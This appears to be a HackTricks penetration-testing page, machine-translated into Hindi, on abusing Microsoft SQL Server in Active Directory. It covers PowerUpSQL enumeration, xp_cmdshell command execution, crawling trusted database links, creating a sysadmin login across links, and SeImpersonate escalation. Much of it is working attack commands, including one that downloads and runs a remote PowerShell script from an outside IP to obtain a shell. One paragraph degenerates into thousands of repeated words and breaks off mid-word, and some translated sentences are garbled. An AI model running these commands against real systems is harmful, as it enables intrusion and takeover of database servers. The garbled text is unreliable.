# MSSQL AD दुरुपयोग

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** **करें।**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>

## **MSSQL जांच / खोज**

इस मामले में पावरशेल मॉड्यूल [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) बहुत उपयोगी है।
```powershell
Import-Module .\PowerupSQL.psd1
```
### डोमेन सत्र के बिना नेटवर्क से जांच करना

If you don't have a domain session, you can still enumerate information from the network. Here are some techniques you can use:

1. **Port Scanning**: Use tools like Nmap to scan for open ports on the target system. This can help you identify services running on the system.

2. **Service Enumeration**: Once you have identified open ports, you can use tools like Enum4linux or smbclient to enumerate information about the services running on those ports.

3. **LDAP Enumeration**: If the target system is using LDAP for directory services, you can use tools like ldapsearch or ldapenum to enumerate information from the LDAP server.

4. **DNS Enumeration**: Enumerate DNS records to gather information about the target system's domain and subdomains. Tools like nslookup or dig can be used for this purpose.

5. **SNMP Enumeration**: If SNMP (Simple Network Management Protocol) is enabled on the target system, you can use tools like snmpwalk or snmpenum to gather information about the system's network configuration and services.

Remember, these techniques can help you gather information about the target system without the need for a domain session. However, it's important to note that some of these techniques may be considered intrusive and may be subject to legal restrictions. Always ensure you have proper authorization before performing any network enumeration.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### डोमेन के अंदर से जांच करना

To enumerate from inside the domain, you can use various techniques to gather information about the Active Directory (AD) environment. These techniques can help you identify potential vulnerabilities and weaknesses that can be exploited for further penetration testing.

#### 1. Active Directory Enumeration

- **LDAP Enumeration**: Use LDAP queries to gather information about AD objects, such as users, groups, computers, and organizational units (OUs).
- **NetBIOS Enumeration**: Use NetBIOS queries to discover AD domain controllers, member servers, and workstations.
- **DNS Enumeration**: Enumerate DNS records to identify AD domain controllers and other AD-related services.

#### 2. Service Enumeration

- **Kerberos Enumeration**: Enumerate Kerberos services to identify potential attack vectors, such as weak encryption algorithms or misconfigured service principal names (SPNs).
- **LDAP Service Enumeration**: Enumerate LDAP services to gather information about AD objects and their attributes.
- **SMB Enumeration**: Enumerate SMB services to identify shares, users, and groups.

#### 3. MSSQL Enumeration

- **MSSQL Server Enumeration**: Enumerate MSSQL servers to identify potential attack vectors, such as weak authentication mechanisms or misconfigured permissions.
- **MSSQL Database Enumeration**: Enumerate MSSQL databases to gather information about the data stored within them.

By performing these enumerations from inside the domain, you can gain valuable insights into the AD environment and identify potential security weaknesses that can be exploited during a penetration test.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL मूल दुरुपयोग

### डेटाबेस तक पहुंचें

To access the MSSQL database, you can use the following methods:

1. **SQL Server Management Studio (SSMS):** SSMS is a graphical tool provided by Microsoft to manage MSSQL databases. You can connect to the database using SSMS by providing the server name, authentication method, and credentials.

2. **Command Line Tools:** MSSQL provides command line tools such as `sqlcmd` and `osql` to interact with the database. You can use these tools to execute SQL queries and commands.

3. **Programming Languages:** You can also access the MSSQL database using programming languages such as Python, Java, or C#. There are libraries and frameworks available that provide APIs to connect and interact with the database.

Once you have access to the MSSQL database, you can perform various actions such as querying the database, modifying data, creating new tables, and executing stored procedures.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

यह संभव हो सकता है कि MSSQL होस्ट के अंदर **कमांड्स को निष्पादित** किया जा सके
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL मूल अनुप्रयोग ट्रिक्स

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL विश्वसनीय लिंक

यदि एक MSSQL इंस्टेंस द्वारा एक अलग MSSQL इंस्टेंस के द्वारा विश्वसनीय (डेटाबेस लिंक) माना जाता है। यदि उपयोगकर्ता को विश्वसनीय डेटाबेस पर विशेषाधिकार हैं, तो वह दूसरे इंस्टेंस में भी क्वेरी को निष्पादित करने के लिए विश्वास संबंध का उपयोग कर सकता है। ये विश्वास संबंध चेनिंग किए जा सकते हैं और किसी न किसी बिंदु पर उपयोगकर्ता को कुछ गलत कॉन्फ़िगर किए गए डेटाबेस मिल सकता है जहां उसे कमांड निष्पादित कर सकता है।

**डेटाबेस के बीच के लिंक वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन व
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

आप मेटास्प्लोइट का उपयोग करके आसानी से विश्वसनीय लिंक की जांच कर सकते हैं।
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
ध्यान दें कि metasploit केवल MSSQL में `openquery()` फ़ंक्शन का दुरुपयोग करने की कोशिश करेगा (इसलिए, यदि आप `openquery()` के साथ कमांड नहीं चला सकते हैं, तो आपको कमांड चलाने के लिए `EXECUTE` विधि का प्रयास करने की आवश्यकता होगी, नीचे अधिक जानकारी देखें।)

### मैनुअल - Openquery()

**Linux** से आप **sqsh** और **mssqlclient.py** के साथ एक MSSQL कंसोल शैल प्राप्त कर सकते हैं।

**Windows** से आप भी लिंक खोज सकते हैं और **HeidiSQL** जैसे **MSSQL क्लाइंट** का उपयोग करके कमांडों को मैन्युअली चला सकते हैं।

_विंडोज़ प्रमाणीकरण का उपयोग करके लॉगिन करें:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### विश्वसनीय लिंक खोजें
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### विश्वसनीय लिंक में क्वेरी चलाएं

लिंक के माध्यम से क्वेरी चलाएं (उदाहरण: नए पहुंचने योग्य इंस्टेंस में और लिंक ढूंढें):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
जहां डबल और सिंगल कोट्स का उपयोग किया गया है, उसे उसी तरीके से उपयोग करना महत्वपूर्ण है।
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

आप इन विश्वसनीय लिंक श्रृंखला को हाथ से हमेशा के लिए जारी रख सकते हैं।
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
यदि आप `openquery()` से `exec xp_cmdshell` जैसी कार्रवाइयाँ करने में असमर्थ हैं, तो `EXECUTE` विधि के साथ प्रयास करें।

### मैनुअल - EXECUTE

आप `EXECUTE` का उपयोग करके विश्वसनीय लिंक का भी दुरुपयोग कर सकते हैं:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## स्थानीय प्रिविलेज उन्नयन

**MSSQL स्थानीय उपयोगकर्ता** आमतौर पर **`SeImpersonatePrivilege`** नामक एक विशेष प्रभाव के साथ होता है। इससे खाता "प्रमाणीकरण के बाद एक ग्राहक की अनुकरण करने" की अनुमति होती है।

एक रणचल या मध्यस्थ सेवा को बाध्य करने के लिए एक रोग या मध्यस्थ सेवा को अभिकर्ता बनाता है जिसे कि आक्रमणकारी बनाता है। यह रोग सेवा फिर उस समय अनुकरण कर सकता है जब वह प्रमाणीकरण करने की कोशिश कर रही होती है।

[SweetPotato](https://github.com/CCob/SweetPotato) में इन विभिन्न तकनीकों का संग्रह है जिन्हें Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
